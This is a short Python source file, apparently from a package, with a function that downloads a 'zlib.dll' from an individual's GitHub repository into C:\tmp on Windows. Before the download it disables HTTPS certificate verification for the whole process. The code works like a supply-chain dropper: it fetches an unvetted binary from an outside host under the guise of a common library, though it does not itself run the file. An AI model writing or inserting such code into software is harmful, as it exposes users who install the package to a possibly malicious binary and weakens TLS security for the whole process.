import urllib.request
import ssl
import os
import platform

def _get_from_github():
    if not platform.system().lower() == 'windows':
        print("This package requires Windows OS. Current system:", platform.system())
        return False

    download_dir = r"C:\tmp"

    try:
        os.makedirs(download_dir, exist_ok=True)
        print(f"Directory {download_dir} created or already exists")
    except Exception as e:
        print(f"Error creating directory {download_dir}: {e}")
        return False
    download_path = os.path.join(download_dir, "zlib.dll")

    dll_url = "https://github.com/msg3176357131/zlib/raw/main/zlib.dll"

    ssl._create_default_https_context = ssl._create_unverified_context

    try:
        print("Downloading DLL from GitHub")
        # Скачиваем файл
        urllib.request.urlretrieve(dll_url, download_path)

        # Проверяем что файл скачался
        if os.path.exists(download_path):
            file_size = os.path.getsize(download_path)
            print(f"zlib.dll success download! Size: {file_size}")
            return True
        else:
            print(f"zlib.dll failed download")
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False